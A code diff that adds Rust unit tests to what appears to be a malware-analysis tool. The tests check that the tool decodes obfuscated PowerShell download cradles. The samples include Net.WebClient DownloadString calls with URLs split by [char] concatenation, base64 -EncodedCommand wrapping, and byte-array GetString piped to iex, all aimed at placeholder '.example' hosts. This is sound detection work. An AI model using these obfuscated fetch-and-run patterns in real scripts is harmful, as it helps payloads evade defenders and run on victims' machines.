@@ -8400,6 +8400,72 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_char_plus_literal_concat_resolves_url() {
+        use base64::Engine;
+        let inner = r#"(New-Object Net.WebClient).DownloadString([char]104 + 'ttp://ps-char-literal.example/payload')"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://ps-char-literal.example/payload"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell [char] + literal URL concat missed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_literal_char_literal_concat_resolves_url() {
+        use base64::Engine;
+        let inner = r#"(New-Object Net.WebClient).DownloadString('ht' + [char]116 + 'p://ps-lit-char.example/payload')"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://ps-lit-char.example/payload"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell literal + [char] + literal URL concat missed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_byte_array_getstring() {
+        let bytes = "https://byte-array.example/stage.ps1"
+            .bytes()
+            .map(|b| b.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let ps = format!("[Text.Encoding]::ASCII.GetString([byte[]]({bytes})) | iex");
+
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+
+        assert!(
+            normalized.contains("https://byte-array.example/stage.ps1"),
+            "byte-array GetString call was not decoded:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_nested_gzip_format_base64() {
         use base64::Engine;
         use std::io::Write;
